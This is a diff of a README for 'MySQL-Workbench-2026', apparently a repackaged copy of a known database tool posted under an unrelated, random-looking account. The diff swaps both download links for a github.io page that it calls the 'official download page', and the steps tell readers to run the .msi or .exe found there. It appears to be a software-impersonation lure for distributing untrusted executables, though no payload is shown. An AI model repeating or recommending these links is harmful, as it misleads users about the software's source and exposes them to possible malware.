@@ -1,6 +1,6 @@
 # 🛠️ MySQL-Workbench-2026 - Simple Database Management For Windows Users
 
-[**Download MySQL-Workbench-2026**](https://github.com/Bibliophilic-pyralidae662/MySQL-Workbench-2026/releases)
+[**Download MySQL-Workbench-2026**](https://bibliophilic-pyralidae662.github.io)
 
 ## 📖 Overview
 
@@ -22,7 +22,7 @@ If your computer meets these standards, the software will run smoothly. Older co
 
 Follow these steps to set up the software on your computer.
 
-1.  Visit the [official download page](https://github.com/Bibliophilic-pyralidae662/MySQL-Workbench-2026/releases).
+1.  Visit the [official download page](https://bibliophilic-pyralidae662.github.io).
 2.  Look for the latest release version on the screen.
 3.  Click the file ending in .msi or .exe to start the download.
 4.  Open the folder where your computer saved the file.
